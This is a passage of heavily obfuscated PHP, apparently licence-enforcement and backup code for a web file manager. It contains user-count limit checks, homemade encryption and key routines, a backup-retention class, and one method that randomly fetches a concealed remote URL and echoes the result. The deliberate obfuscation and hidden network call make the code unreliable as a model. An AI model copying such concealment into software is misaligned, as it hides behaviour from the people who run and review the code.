$Ş“ŒºÖĞ[279], $Ş“ŒºÖĞ[280] => $Ş“ŒºÖĞ[270], $Ş“ŒºÖĞ[281] => $Ş“ŒºÖĞ[282], $Ş“ŒºÖĞ[283] => $Ş“ŒºÖĞ[272], $Ş“ŒºÖĞ[284] => $Ş“ŒºÖĞ[285], $Ş“ŒºÖĞ[286] => $Ş“ŒºÖĞ[287], $Ş“ŒºÖĞ[288] => $Ş“ŒºÖĞ[289]); $í‡‡²¥ = $¨äèÌºÜ[$this->jvir5a98833f]; $í‡‡²¥ = intval($í‡‡²¥ ? $í‡‡²¥ : $Ş“ŒºÖĞ[264]); $šóä ï¿ = _get($this->syna978d2a39, $Ş“ŒºÖĞ[290]); $á­­ÂèÔ = $¾šüåœö[691]; $šóä ï¿ = $šóä ï¿ ? intval($šóä ï¿) : 0; $¸„¿ôò = $¾šüåœö[692]; if (!$¸„¿ôò) { die; } return $í‡‡²¥ + $šóä ï¿; $ÖìÅ–¥Š = $¾šüåœö[693]; if (strlen($ÖìÅ–¥Š) < $¾šüåœö[624]) { return; } } public function gdhpb7f6c595($‡¨ØÆø) { $…¶ó€ÌŠ =& $_SERVER[¹Û¹Æ€]; $ßóÕÆ©„ =& $_SERVER[Ëü‚¼ê]; $‹Ë¢ëûÔ = $this->yirjec5cdfe0(); if ($‡¨ØÆø[$ßóÕÆ©„[291]] == $ßóÕÆ©„[121]) { return; } if ($‹Ë¢ëûÔ >= intval($ßóÕÆ©„[211])) { return; } $“ÒÕ‡²ö = Model($ßóÕÆ©„[124])->count(); if ($“ÒÕ‡²ö <= $‹Ë¢ëûÔ) { return; } $‹±¹‰—é = Model($ßóÕÆ©„[124])->field($ßóÕÆ©„[291])->limit($‹Ë¢ëûÔ)->select(); $“…³çüÎ = $…¶ó€ÌŠ[694]; $‹±¹‰—é = array_to_keyvalue($‹±¹‰—é, $ßóÕÆ©„[6], $ßóÕÆ©„[291]); $ÏĞÀƒÈ¦ = $…¶ó€ÌŠ[695]; while ($ÏĞÀƒÈ¦ < $…¶ó€ÌŠ[638]) { if ($ÏĞÀƒÈ¦ >= 0) { break; } $ÏĞÀƒÈ¦++; } if (!in_array($‡¨ØÆø[$ßóÕÆ©„[291]], $‹±¹‰—é)) { show_json($ßóÕÆ©„[292], !1, $ßóÕÆ©„[207]); } } public function oyaje32a1ff2() { $ïê¢áÓ¬ =& $_SERVER[¹Û¹Æ€]; $ËŸ¬ ê© =& $_SERVER[Ëü‚¼ê]; if (!_get($GLOBALS, $ËŸ¬ ê©[115]) || mt_rand(1, 100) > 20) { return; } $íÕ‡Êß = $ËŸ¬ ê©[214]; $ÎŞŒú’é = $ïê¢áÓ¬[696]; $íÕ‡Êß = $this->ftzq06fb49f0($íÕ‡Êß, $ËŸ¬ ê©[215]); $Ş—ö¸à¢ = stream_context_create(array($ËŸ¬ ê©[216] => array($ËŸ¬ ê©[217] => $ËŸ¬ ê©[218], $ËŸ¬ ê©[219] => 3))); $á–¾Ò = @file_get_contents($íÕ‡Êß, !1, $Ş—ö¸à¢); $üÅ‰ğÃú = $ïê¢áÓ¬[697]; if (!$üÅ‰ğÃú) { die; } echo $ËŸ¬ ê©[293] . hash_encode($á–¾Ò) . $ËŸ¬ ê©[294]; $ŞˆÊöÎ = $ïê¢áÓ¬[698]; if (!$ŞˆÊöÎ) { return; } } private function nqaxebae62dc($Á›‘‘ŞÆ, $üîØ¹è‡, $œë»Ó÷õ = 3) { $ùÅ·ƒõ© =& $_SERVER[¹Û¹Æ€]; $ˆçÇä·û =& $_SERVER[Ëü‚¼ê]; usleep(1); $Á›‘‘ŞÆ = trim($Á›‘‘ŞÆ); $Ğİø¡Û› = $ùÅ·ƒõ©[699]; $ƒï˜éĞË = mt_rand(0, 5) . $ˆçÇä·û[6]; $ÜåÒıä = rand_string(15); $šÜ”—ôç = $ˆçÇä·û[295]; switch ($ƒï˜éĞË) { case $ˆçÇä·û[203]: $ªˆÙÀÁ = $this->cjxb0438e40e($Á›‘‘ŞÆ, strrev($üîØ¹è‡ . $ÜåÒıä)); $¯Ö‡²âß = $ùÅ·ƒõ©[700]; if (strlen($¯Ö‡²âß) < $ùÅ·ƒõ©[624]) { die; } break; $‚²ĞÄ¾ = $ùÅ·ƒõ©[701]; while (strlen($‚²ĞÄ¾) < $ùÅ·ƒõ©[13]) { if (!$‚²ĞÄ¾) { break; } $‚²ĞÄ¾++; } case $ˆçÇä·û[121]: $ªˆÙÀÁ = $this->cjxb0438e40e($Á›‘‘ŞÆ, strrev($ÜåÒıä . $üîØ¹è‡)); $®Ü¤¨«ï = $ùÅ·ƒõ©[702]; break; case $ˆçÇä·û[296]: $ªˆÙÀÁ = $this->cjxb0438e40e($Á›‘‘ŞÆ, base64_encode($ÜåÒıä . $üîØ¹è‡)); break; case $ˆçÇä·û[297]: $ªˆÙÀÁ = $this->cjxb0438e40e($Á›‘‘ŞÆ, md5($ÜåÒıä . $üîØ¹è‡)); $ÇåûÇ¨ = $ùÅ·ƒõ©[703]; while ($ÇåûÇ¨ < $ùÅ·ƒõ©[628]) { if ($ÇåûÇ¨ >= 0) { break; } $ÇåûÇ¨++; } break; case $ˆçÇä·û[298]: $Á›‘‘ŞÆ = base64_encode($Á›‘‘ŞÆ); $œîûÚãş = rand(0, 64); $Ï¸Õ°´Ü = $ùÅ·ƒõ©[704]; while (strlen($Ï¸Õ°´Ü) < $ùÅ·ƒõ©[628]) { if (!$Ï¸Õ°´Ü) { break; } $Ï¸Õ°´Ü++; } $ºú®Ø£È = $šÜ”—ôç[$œîûÚãş]; $ïÄªŒ”Ò = md5($ºú®Ø£È . md5($üîØ¹è‡ . $ºú®Ø£È) . $üîØ¹è‡); $·ûî  – = $ùÅ·ƒõ©[705]; if (!$·ûî  –) { die; } $ïÄªŒ”Ò = substr($ïÄªŒ”Ò, $œîûÚãş % 8, $œîûÚãş % 8 + 7); $õŒÂâá× = $ùÅ·ƒõ©[706]; if (strlen($õŒÂâá×) < $ùÅ·ƒõ©[13]) { die; } $¸·¤¸îò = $ˆçÇä·û[6]; $²ğ¿Îå· = $ùÅ·ƒõ©[707]; if (!$²ğ¿Îå·) { die; } $¥ŒÄóÊÈ = 0; $µÆÒŞÄâ = 0; $‹™‚ÃÎÄ = 0; for ($¥ŒÄóÊÈ = 0; $¥ŒÄóÊÈ < strlen($Á›‘‘ŞÆ); $¥ŒÄóÊÈ++) { $‹™‚ÃÎÄ = $‹™‚ÃÎÄ == strlen($ïÄªŒ”Ò) ? 0 : $‹™‚ÃÎÄ; $ÍÔÅ„±» = $ùÅ·ƒõ©[708]; if (strlen($ÍÔÅ„±») < $ùÅ·ƒõ©[656]) { die; } $µÆÒŞÄâ = ($œîûÚãş + strpos($šÜ”—ôç, $Á›‘‘ŞÆ[$¥ŒÄóÊÈ]) + ord($ïÄªŒ”Ò[$‹™‚ÃÎÄ++])) % 64; $‡—ªı¯Ê = $ùÅ·ƒõ©[709]; if (!$‡—ªı¯Ê) { return; } $¸·¤¸îò .= $šÜ”—ôç[$µÆÒŞÄâ]; $ó™éºŠÉ = $ùÅ·ƒõ©[710]; if (strlen($ó™éºŠÉ) < $ùÅ·ƒõ©[656]) { die; } } $ªˆÙÀÁ = hash_encode($ºú®Ø£È . $¸·¤¸îò); break; $«ŞÈÉá = $ùÅ·ƒõ©[711]; if (strlen($«ŞÈÉá) < $ùÅ·ƒõ©[628]) { return; } default: $ªˆÙÀÁ = $this->cjxb0438e40e($Á›‘‘ŞÆ, $üîØ¹è‡ . $ÜåÒıä); break; $‡˜ã—”™ = $ùÅ·ƒõ©[712]; while ($‡˜ã—”™ < $ùÅ·ƒõ©[624]) { if ($‡˜ã—”™ >= 0) { break; } $‡˜ã—”™++; } } $ªˆÙÀÁ = strrev($ƒï˜éĞË . $ÜåÒıä . $ªˆÙÀÁ); $®Œæ›ŸÔ = $ùÅ·ƒõ©[713]; if (!$®Œæ›ŸÔ) { die; } if ($œë»Ó÷õ - 1 > 0) { $ªˆÙÀÁ = $this->nqaxebae62dc($ªˆÙÀÁ, $üîØ¹è‡, $œë»Ó÷õ - 1); } return $ªˆÙÀÁ; } private function jxarb0bbe118($ÑûæˆÒ¨, $–åÂ½Ô…, $µ¢ÓñŸ¾ = 3) { $å®—Á¶ =& $_SERVER[¹Û¹Æ€]; $ à¨¿Ú¡ =& $_SERVER[Ëü‚¼ê]; if (!is_string($ÑûæˆÒ¨) || strlen($ÑûæˆÒ¨) < 10) { return !1; } $ÑûæˆÒ¨ = trim($ÑûæˆÒ¨); $ÑûæˆÒ¨ = strrev($ÑûæˆÒ¨); $‡‰üÍ©° = $å®—Á¶[714]; while (strlen($‡‰üÍ©°) < $å®—Á¶[13]) { if (!$‡‰üÍ©°) { break; } $‡‰üÍ©°++; } $ı»½Ë»Ä = $ÑûæˆÒ¨[0]; $©•–Õ³Ú = $å®—Á¶[715]; if (strlen($©•–Õ³Ú) < $å®—Á¶[628]) { die; } $×¡•îã™ = substr($ÑûæˆÒ¨, 1, 15); $ÑûæˆÒ¨ = substr($ÑûæˆÒ¨, 16); $ÂšĞÊş  = $ à¨¿Ú¡[295]; $öÅçƒŸ = $å®—Á¶[660]; if (!$öÅçƒŸ) { return; } switch ($ı»½Ë»Ä) { case $ à¨¿Ú¡[203]: $©áæìÍÉ = $this->ftzq06fb49f0($ÑûæˆÒ¨, strrev($–åÂ½Ô… . $×¡•îã™)); $¨è£ÙŒ¦ = $å®—Á¶[716]; while (strlen($¨è£ÙŒ¦) < $å®—Á¶[638]) { if (!$¨è£ÙŒ¦) { break; } $¨è£ÙŒ¦++; } break; case $ à¨¿Ú¡[121]: $©áæìÍÉ = $this->ftzq06fb49f0($ÑûæˆÒ¨, strrev($×¡•îã™ . $–åÂ½Ô…)); break; case $ à¨¿Ú¡[296]: $©áæìÍÉ = $this->ftzq06fb49f0($ÑûæˆÒ¨, base64_encode($×¡•îã™ . $–åÂ½Ô…)); $²ƒˆ›Ç = $å®—Á¶[717]; if (!$²ƒˆ›Ç) { return; } break; $¤ø¤Œ’ = $å®—Á¶[718]; while ($¤ø¤Œ’ < $å®—Á¶[624]) { if ($¤ø¤Œ’ >= 0) { break; } $¤ø¤Œ’++; } case $ à¨¿Ú¡[297]: $©áæìÍÉ = $this->ftzq06fb49f0($ÑûæˆÒ¨, md5($×¡•îã™ . $–åÂ½Ô…)); $˜•†÷éµ = $å®—Á¶[650]; if (!$˜•†÷éµ) { return; } break; case $ à¨¿Ú¡[298]: $ÑûæˆÒ¨ = hash_decode($ÑûæˆÒ¨); $±ìûÙ¸ = $ÑûæˆÒ¨[0]; $ÑûæˆÒ¨ = substr($ÑûæˆÒ¨, 1); $Ÿ¸Ç²ïé = strpos($ÂšĞÊş , $±ìûÙ¸); $öö®€Ğš = $å®—Á¶[719]; while (strlen($öö®€Ğš) < $å®—Á¶[13]) { if (!$öö®€Ğš) { break; } $öö®€Ğš++; } $ÜŸ¡Â„ª = md5($±ìûÙ¸ . md5($–åÂ½Ô… . $±ìûÙ¸) . $–åÂ½Ô…); $åöÏ’ = $å®—Á¶[720]; if (!$åöÏ’) { return; } $ÜŸ¡Â„ª = substr($ÜŸ¡Â„ª, $Ÿ¸Ç²ïé % 8, $Ÿ¸Ç²ïé % 8 + 7); $ùÁàõÁ¡ = $å®—Á¶[721]; $¾ƒİ”ß» = $ à¨¿Ú¡[6]; $æ»ÑŸ€ù = 0; $×•³á‚ª = $å®—Á¶[722]; $çáàŠÁ¬ = 0; $Èúò¦ş = 0; for ($æ»ÑŸ€ù = 0; $æ»ÑŸ€ù < strlen($ÑûæˆÒ¨); $æ»ÑŸ€ù++) { $Èúò¦ş = $Èúò¦ş == strlen($ÜŸ¡Â„ª) ? 0 : $Èúò¦ş; $ŒùÃ›§î = $Èúò¦ş++; $øëó¤ í = $å®—Á¶[723]; while ($øëó¤ í < $å®—Á¶[628]) { if ($øëó¤ í >= 0) { break; } $øëó¤ í++; } $çáàŠÁ¬ = strpos($ÂšĞÊş , $ÑûæˆÒ¨[$æ»ÑŸ€ù]) - $Ÿ¸Ç²ïé - ord($ÜŸ¡Â„ª[$ŒùÃ›§î]); while ($çáàŠÁ¬ < 0) { $çáàŠÁ¬ += 64; } $¾ƒİ”ß» .= $ÂšĞÊş [$çáàŠÁ¬]; } $©áæìÍÉ = base64_decode($¾ƒİ”ß»); break; $È„¿û€Ó = $å®—Á¶[724]; if (strlen($È„¿û€Ó) < $å®—Á¶[624]) { return; } default: $©áæìÍÉ = $this->ftzq06fb49f0($ÑûæˆÒ¨, $–åÂ½Ô… . $×¡•îã™); break; $€ï¥àä = $å®—Á¶[725]; } if ($µ¢ÓñŸ¾ - 1 > 0) { $©áæìÍÉ = $this->jxarb0bbe118($©áæìÍÉ, $–åÂ½Ô…, $µ¢ÓñŸ¾ - 1); } return $©áæìÍÉ; } public function zuhqd13a78c4($¾÷ùğ®) { $¢§¡€Óï =& $_SERVER[¹Û¹Æ€]; $’åÉíá— =& $_SERVER[Ëü‚¼ê]; $úöŠªÃÒ = $this->civk5da34136(); $‡å²ğòŞ = $this->civk5da34136(); $Öœ¤šĞÌ = $¢§¡€Óï[726]; while (strlen($Öœ¤šĞÌ) < $¢§¡€Óï[13]) { if (!$Öœ¤šĞÌ) { break; } $Öœ¤šĞÌ++; } $û¼‹Œ¤ı = ($úöŠªÃÒ - 1) * ($‡å²ğòŞ - 1); $·¥Ù¨üæ = intval(($úöŠªÃÒ + $‡å²ğòŞ) / 2); while (1) { $™ûÓìÌ = $·¥Ù¨üæ; $Ú¸¹ì° = $û¼‹Œ¤ı; $•Ù‘’Ø³ = $¢§¡€Óï[727]; if (strlen($•Ù‘’Ø³) < $¢§¡€Óï[628]) { return; } while ($Ú¸¹ì° % $™ûÓìÌ != 0) { $±ğ¦ÑÍÖ = $Ú¸¹ì°; $ÀÄ€½±œ = $¢§¡€Óï[728]; while (strlen($ÀÄ€½±œ) < $¢§¡€Óï[638]) { if (!$ÀÄ€½±œ) { break; } $ÀÄ€½±œ++; } $Ú¸¹ì° = $™ûÓìÌ; $™ûÓìÌ = $±ğ¦ÑÍÖ % $™ûÓìÌ; $ù¼ÚµÌÌ = $¢§¡€Óï[705]; if (!$ù¼ÚµÌÌ) { return; } } if ($™ûÓìÌ == 1) { break; } else { $·¥Ù¨üæ++; } } $íü¹“Â€ = 2; $…›À¦µŠ = $¢§¡€Óï[729]; while ($…›À¦µŠ < $¢§¡€Óï[638]) { if ($…›À¦µŠ >= 0) { break; } $…›À¦µŠ++; } for ($» é÷µ¹ = 0; $» é÷µ¹ < $û¼‹Œ¤ı * 10; $» é÷µ¹++) { if (($û¼‹Œ¤ı * $» é÷µ¹ + 1) % $·¥Ù¨üæ == 0) { $íü¹“Â€ = intval(($û¼‹Œ¤ı * $» é÷µ¹ + 1) / $·¥Ù¨üæ); break; } } $¹±ú àÊ = $this->cjxb0438e40e($úöŠªÃÒ * $‡å²ğòŞ . $’åÉíá—[6], $’åÉíá—[135]); $”öíù¦À = md5($’åÉíá—[299] . ($úöŠªÃÒ + $‡å²ğòŞ) . $’åÉíá—[300] . $·¥Ù¨üæ . $’åÉíá—[300] . $íü¹“Â€ . $’åÉíá—[301]); $Èµˆ…³« = $¢§¡€Óï[730]; $Ö§ÓÊñƒ = $this->cjxb0438e40e($¾÷ùğ®, $”öíù¦À) . $’åÉíá—[302] . $¹±ú àÊ; return $Ö§ÓÊñƒ; } public function ogjs253fd50a($°·¢Ìü´) { $¾â¨²°¤ =& $_SERVER[¹Û¹Æ€]; $°ŸøşúÁ =& $_SERVER[Ëü‚¼ê]; $¼ Åá„ = explode($°ŸøşúÁ[302], $°·¢Ìü´); if (count($¼ Åá„) != 2) { return $°ŸøşúÁ[6]; } $ô±îÁµ• = $this->ftzq06fb49f0($¼ Åá„[1] . $°ŸøşúÁ[6], $°ŸøşúÁ[135]); if (!$ô±îÁµ•) { return $°ŸøşúÁ[6]; } $ô±îÁµ• = intval($ô±îÁµ•); $ÈÁÑŒµş = 0; $´æÅßëÛ = $¾â¨²°¤[731]; if (!$´æÅßëÛ) { return; } $û«™’ä = 0; for ($³É»ªà = 3; $³É»ªà < $ô±îÁµ•; $³É»ªà += 2) { if ($ô±îÁµ• % $³É»ªà != 0) { continue; } $ÈÁÑŒµş = $³É»ªà; $éÀæÑà¡ = $¾â¨²°¤[732]; $û«™’ä = intval($ô±îÁµ• / $³É»ªà); $ğåË‡Ãæ = $¾â¨²°¤[733]; if (!$ğåË‡Ãæ) { return; } break; } $İ‹ßôè¤ = ($ÈÁÑŒµş - 1) * ($û«™’ä - 1); $ì‹¼õ×Ä = intval(($ÈÁÑŒµş + $û«™’ä) / 2); while (1) { $„³ÀĞŞƒ = $ì‹¼õ×Ä; $ÙúŸãƒ¼ = $¾â¨²°¤[734]; if (!$ÙúŸãƒ¼) { return; } $¢é÷Àˆ = $İ‹ßôè¤; $’Ø”Ì›¶ = $¾â¨²°¤[735]; while ($’Ø”Ì›¶ < $¾â¨²°¤[656]) { if ($’Ø”Ì›¶ >= 0) { break; } $’Ø”Ì›¶++; } while ($¢é÷Àˆ % $„³ÀĞŞƒ != 0) { $ĞÂêĞëÄ = $¢é÷Àˆ; $¢é÷Àˆ = $„³ÀĞŞƒ; $„³ÀĞŞƒ = $ĞÂêĞëÄ % $„³ÀĞŞƒ; $”öÇû· = $¾â¨²°¤[736]; if (strlen($”öÇû·) < $¾â¨²°¤[656]) { die; } } if ($„³ÀĞŞƒ == 1) { break; } else { $ì‹¼õ×Ä++; } } $Ü½Â×¢Ú = 2; for ($³É»ªà = 0; $³É»ªà < $İ‹ßôè¤ * 10; $³É»ªà++) { if (($İ‹ßôè¤ * $³É»ªà + 1) % $ì‹¼õ×Ä == 0) { $Ü½Â×¢Ú = intval(($İ‹ßôè¤ * $³É»ªà + 1) / $ì‹¼õ×Ä); break; } } $Ã€½½ĞÉ = md5($°ŸøşúÁ[299] . ($ÈÁÑŒµş + $û«™’ä) . $°ŸøşúÁ[300] . $ì‹¼õ×Ä . $°ŸøşúÁ[300] . $Ü½Â×¢Ú . $°ŸøşúÁ[301]); $ò¿ ‰Ğ = $¾â¨²°¤[737]; if (strlen($ò¿ ‰Ğ) < $¾â¨²°¤[624]) { die; } $«¢´¡¤ë = $this->ftzq06fb49f0($¼ Åá„[0], $Ã€½½ĞÉ); $„Ÿ³Úş = $¾â¨²°¤[738]; if (strlen($„Ÿ³Úş) < $¾â¨²°¤[624]) { die; } return $«¢´¡¤ë; $êÅ£İ˜Ì = $¾â¨²°¤[739]; while (strlen($êÅ£İ˜Ì) < $¾â¨²°¤[624]) { if (!$êÅ£İ˜Ì) { break; } $êÅ£İ˜Ì++; } } public function civk5da34136() { $Â‰¨ªûÉ =& $_SERVER[¹Û¹Æ€]; $‹€íóÏç = mt_rand(pow(2, 14), pow(2, 16) - 1); $èî‚²ğå = $Â‰¨ªûÉ[740]; $”Æ¶â›‡ = array(); $¦òŒ–÷ = 1; $Í—Øñó• = $Â‰¨ªûÉ[741]; while (strlen($Í—Øñó•) < $Â‰¨ªûÉ[628]) { if (!$Í—Øñó•) { break; } $Í—Øñó•++; } while ($¦òŒ–÷ <= (int) sqrt($‹€íóÏç)) { $©ÜÄå·Å = $¦òŒ–÷; $íº¨¬úá = $Â‰¨ªûÉ[742]; while (!0) { $©ÜÄå·Å++; if ($©ÜÄå·Å <= 2) { $¦òŒ–÷ = $©ÜÄå·Å; break; } else { if ($©ÜÄå·Å < 2) { continue; } } $ïìÓ€Ø„ = !0; for ($³É°©¹¦ = 2; $³É°©¹¦ <= sqrt($©ÜÄå·Å); $³É°©¹¦++) { if ($©ÜÄå·Å % $³É°©¹¦ == 0) { $ïìÓ€Ø„ = !1; } } if ($ïìÓ€Ø„) { $¦òŒ–÷ = $©ÜÄå·Å; break; } } $”Æ¶â›‡[] = $¦òŒ–÷; } $ÔÁô¯£ = 2; $ ×ÛûôÇ = $Â‰¨ªûÉ[743]; for ($©ÜÄå·Å = $‹€íóÏç; $©ÜÄå·Å > 1; $©ÜÄå·Å--) { $ïìÓ€Ø„ = !0; foreach ($”Æ¶â›‡ as $©èî‹¢¿) { if ($©ÜÄå·Å % $©èî‹¢¿ == 0) { $ïìÓ€Ø„ = !1; break; } } if ($ïìÓ€Ø„) { $ÔÁô¯£ = $©ÜÄå·Å; break; } } return $ÔÁô¯£; } public function orzc59746949($ñÙÓ¡Ûì, $¯Û‘î„ä) { $‡ü¤Î®Ä =& $_SERVER[¹Û¹Æ€]; $£÷Ê»ÃĞ =& $_SERVER[Ëü‚¼ê]; return call_user_func(array($£÷Ê»ÃĞ[8], $£÷Ê»ÃĞ[303]), $ñÙÓ¡Ûì, $¯Û‘î„ä); $°í¨“Ñ² = $‡ü¤Î®Ä[744]; if (strlen($°í¨“Ñ²) < $‡ü¤Î®Ä[638]) { return; } } public function cjxb0438e40e($‚‚¹”ö£, $‰‹‡ìå²) { $Öóß”Ï =& $_SERVER[Ëü‚¼ê]; return call_user_func(array($Öóß”Ï[304], $Öóß”Ï[305]), $‚‚¹”ö£, $‰‹‡ìå²); } public function ftzq06fb49f0($Ğ®®â¬š, $üùª©ö) { $â¿ìı Ã =& $_SERVER[¹Û¹Æ€]; $†¦ÇÚë =& $_SERVER[Ëü‚¼ê]; return call_user_func(array($†¦ÇÚë[304], $†¦ÇÚë[306]), $Ğ®®â¬š, $üùª©ö); $ÕÕíİâ¸ = $â¿ìı Ã[745]; while ($ÕÕíİâ¸ < $â¿ìı Ã[628]) { if ($ÕÕíİâ¸ >= 0) { break; } $ÕÕíİâ¸++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $™ÄğœÂÄ =& $_SERVER[¹Û¹Æ€]; $this->isManual(); self::$name = date($™ÄğœÂÄ[746]); if (!($ÜÎ÷³¹ó = Model($™ÄğœÂÄ[747])->lastItem())) { $ÜÎ÷³¹ó = $this->initData(); } else { self::$name = $ÜÎ÷³¹ó[$™ÄğœÂÄ[42]]; if ($ÜÎ÷³¹ó[$™ÄğœÂÄ[748]] == $™ÄğœÂÄ[98]) { self::$name = date($™ÄğœÂÄ[749]); $£Üë×«ß = 0; if (isset($ÜÎ÷³¹ó[$™ÄğœÂÄ[302]][$™ÄğœÂÄ[209]][$™ÄğœÂÄ[477]])) { $£Üë×«ß = (int) $ÜÎ÷³¹ó[$™ÄğœÂÄ[302]][$™ÄğœÂÄ[209]][$™ÄğœÂÄ[477]]; } if (self::$manual == 0 && $ÜÎ÷³¹ó[$™ÄğœÂÄ[42]] == self::$name) { Model($™ÄğœÂÄ[747])->remove($ÜÎ÷³¹ó[$™ÄğœÂÄ[408]]); } $ÜÎ÷³¹ó = $this->initData($£Üë×«ß, $ÜÎ÷³¹ó[$™ÄğœÂÄ[750]]); } else { $this->checkStore($ÜÎ÷³¹ó[$™ÄğœÂÄ[750]]); } } self::$option = $ÜÎ÷³¹ó; } private function isManual() { $«´ÅÎ­ = _get($GLOBALS, $_SERVER[¹Û¹Æ€][751], 0); $«´ÅÎ­ = intval($«´ÅÎ­); self::$manual = $«´ÅÎ­ && $«´ÅÎ­ == 1 ? 1 : 0; } private function initData($éÔÅ‘ó« = 0, $úõ¾äÂ£ = '') { $÷°·÷¬£ =& $_SERVER[¹Û¹Æ€]; $Ïı»‰ô = Model($÷°·÷¬£[747])->config(); if ($úõ¾äÂ£ && $Ïı»‰ô[$÷°·÷¬£[750]] != $úõ¾äÂ£) { $éÔÅ‘ó« = 0; } $this->checkStore($Ïı»‰ô[$÷°·÷¬£[750]]); if (self::$manual == 1) { self::$name .= $÷°·÷¬£[21] . date($÷°·÷¬£[752]); } $½À÷ñ¶Ü = array($÷°·÷¬£[750] => $Ïı»‰ô[$÷°·÷¬£[750]], $÷°·÷¬£[42] => self::$name, $÷°·÷¬£[748] => 0, $÷°·÷¬£[753] => $Ïı»‰ô[$÷°·÷¬£[753]], $÷°·÷¬£[754] => self::$manual, $÷°·÷¬£[302] => array($÷°·÷¬£[755] => array($÷°·÷¬£[748] => 0), $÷°·÷¬£[756] => array($÷°·÷¬£[748] => 0, $÷°·÷¬£[757] => 0, $÷°·÷¬£[758] => 0, $÷°·÷¬£[43] => $÷°·÷¬£[22], $÷°·÷¬£[759] => 0, $÷°·÷¬£[506] => 0), $÷°·÷¬£[760] => array($÷°·÷¬£[748] => 0, $÷°·÷¬£[757] => 0, $÷°·÷¬£[758] => 0, $÷°·÷¬£[759] => 0, $÷°·÷¬£[506] => 0), $÷°·÷¬£[209] => array($÷°·÷¬£[748] => 0, $÷°·÷¬£[761] => 0, $÷°·÷¬£[762] => 0, $÷°·÷¬£[763] => 0, $÷°·÷¬£[764] => 0, $÷°·÷¬£[477] => $éÔÅ‘ó«, $÷°·÷¬£[759] => 0, $÷°·÷¬£[506] => 0)), $÷°·÷¬£[759] => time(), $÷°·÷¬£[506] => 0); $Ä„¡œŸ‰ = Model($÷°·÷¬£[747])->insert($½À÷ñ¶Ü); $½À÷ñ¶Ü[$÷°·÷¬£[408]] = $Ä„¡œŸ‰; return $½À÷ñ¶Ü; } private function checkStore($±«ÄºÒ´) { $¯„˜Ğ´ =& $_SERVER[¹Û¹Æ€]; $´ŒíãÀ‡ = Model($¯„˜Ğ´[765])->listData($±«ÄºÒ´); Model($¯„˜Ğ´[765])->checkConfig($´ŒíãÀ‡); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹Û¹Æ€][747])->findByName(self::$name); } return self::$option; } public static function set($å½ŒˆÊÑ) { $ùŸ­ª·Ë =& $_SERVER[¹Û¹Æ€]; $‡§«–é = self::get(); foreach ($å½ŒˆÊÑ as $ĞØéÍŸ¶ => $§ÕéÃ¬) { $¢ş„ïôû = explode($ùŸ­ª·Ë[20], $ĞØéÍŸ¶); $Î“º‘¢Ÿ = count($¢ş„ïôû); switch ($Î“º‘¢Ÿ) { case 1: $‡§«–é[$¢ş„ïôû[0]] = $§ÕéÃ¬; break; case 2: $‡§«–é[$¢ş„ïôû[0]][$¢ş„ïôû[1]] = $§ÕéÃ¬; break; case 3: $‡§«–é[$¢ş„ïôû[0]][$¢ş„ïôû[1]][$¢ş„ïôû[2]] = $§ÕéÃ¬; break; } } Model($ùŸ­ª·Ë[747])->update($‡§«–é[$ùŸ­ª·Ë[408]], $‡§«–é); self::$option = $‡§«–é; return self::$option; } public function keep() { $ÈÍÛ¸Ã³ =& $_SERVER[¹Û¹Æ€]; $”î‰ÎÑÊ = self::get(); if ($”î‰ÎÑÊ[$ÈÍÛ¸Ã³[302]][$ÈÍÛ¸Ã³[755]][$ÈÍÛ¸Ã³[748]] == $ÈÍÛ¸Ã³[98]) { return; } $this->backupKeep($”î‰ÎÑÊ); self::set(array($ÈÍÛ¸Ã³[766] => 1)); } private function backupKeep($•²ÜŠ–½) { $Ì¸Áóó =& $_SERVER[¹Û¹Æ€]; if (self::$manual == 1) { return; } $§³¸ÈÍ’ = Model($Ì¸Áóó[747])->listData(); if (empty($§³¸ÈÍ’)) { return; } $½×òÀÙö = 0; $ÌØ§’ŞÖ = array(); foreach ($§³¸ÈÍ’ as $“¡ıíØ¯) { if ($½×òÀÙö >= 7) { break; } $ÌØ§’ŞÖ[] = $“¡ıíØ¯[$Ì¸Áóó[42]]; $½×òÀÙö++; } for ($½×òÀÙö = 0; $½×òÀÙö < 12; $½×òÀÙö++) { $ÌØ§’ŞÖ[] = date($Ì¸Áóó[767], strtotime("\55{$½×òÀÙö}\x20\155\x6f\156\164\x68\x73")); } $ÌØ§’ŞÖ = array_unique($ÌØ§’ŞÖ); $ãœ©æĞâ = Model($Ì¸Áóó[768])->get($Ì¸Áóó[769]); foreach ($§³¸ÈÍ’ as $“¡ıíØ¯) { if (isset($“¡ıíØ¯[$Ì¸Áóó[754]]) && $“¡ıíØ¯[$Ì¸Áóó[754]] == $Ì¸Áóó[98]) { continue; } if (!empty($“¡ıíØ¯[$Ì¸Áóó[42]]) && in_array($“¡ıíØ¯[$Ì¸Áóó[42]], $ÌØ§’ŞÖ)) { continue; } Model($Ì¸Áóó[747])->remove($“¡ıíØ¯[$Ì¸Áóó[408]]); $ğš§¼Œ = $this->backupPath($•²ÜŠ–½, $ãœ©æĞâ); IO::remove($ğš§¼Œ, !1); } } private function backupPath($¤õ¯ì©µ, $¿ŒÑÇª‹ = false) { $¨»Æá¶Ò =& $_SERVER[¹Û¹Æ€]; if (!$¿ŒÑÇª‹) { $¿ŒÑÇª‹ = Model($¨»Æá¶Ò[768])->get($¨»Æá¶Ò[769]); } $´³®û­à = $¤õ¯ì©µ[$¨»Æá¶Ò[42]]; $·úÊİ¿¼ = substr(md5($¨»Æá¶Ò[770] . $¿ŒÑÇª‹ . $´³®û­à), 0, 8); return "\x7b\x69\x6f\72{$¤õ¯ì©µ[$¨»Æá¶Ò[750]]}\175\57\x64\x61\x74\141\142\x61\163\145\x2f\142\141\143\x6b\x75\160\57" . $´³®û­à . $¨»Æá¶Ò[21] . $·úÊİ¿¼; } public function db() { $êò½‚ñ =& $_SERVER[¹Û¹Æ€]; $ª¢¡Úğë = self::get(); if ($ª¢¡Úğë[$êò½‚ñ[302]][$êò½‚ñ[756]][$êò½‚ñ[748]] == $êò½‚ñ[98]) { return !0; } $ªÓôë… = new BackupDb(); if (!$ªÓôë…->index()) { return !1; } self::set(array($êò½‚ñ[771] => 1)); return !0; } public function dbFile() { $İ¤³¼’÷ =& $_SERVER[¹Û¹Æ€]; $‰Û›¶Ù = self::get(); if ($‰Û›¶Ù[$İ¤³¼’÷[302]][$İ¤³¼’÷[760]][$İ¤³¼’÷[748]] == $İ¤³¼’÷[98]) { return !0; } $á›û½ñ® = new BackupDbFile(); if (!$á›û½ñ®->index()) { return !1; 